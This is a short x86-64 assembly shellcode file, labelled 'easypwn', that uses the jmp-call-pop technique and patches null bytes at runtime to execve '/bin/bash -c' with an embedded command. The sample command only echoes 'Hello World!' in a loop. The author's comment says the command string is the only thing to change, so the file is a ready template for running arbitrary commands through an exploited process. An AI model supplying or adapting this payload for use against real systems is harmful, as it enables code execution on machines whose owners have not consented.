; Author:  Chase Hatch
; easypwn:  only place that needs changed is the string following '-cF' in "prog" variable.

section .text
global _start
_start:

	jmp getstr
cp1:
	pop rdi
	xor rax, rax
	mov [rdi+9], byte ah	;A
	mov [rdi+10], rdi	;BBBBBBBB

	lea rbx, [rdi+42]
	mov [rdi+18], rbx	;CCCCCCCC
	mov [rbx+2], byte ah	;F

	lea rbx, [rdi+45]
	mov [rdi+26], rbx	;DDDDDDDD
	mov [rdi+34], rax	;EEEEEEEE
	lea rsi, [rdi+10]
	lea rdx, [rdi+34]
	add al, 59
	syscall


getstr:
	call cp1
	prog: 	db	'/bin/bashABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE-cFfor i in $(seq 1 30); do echo "[$i] Hello World!"; done', 0x00

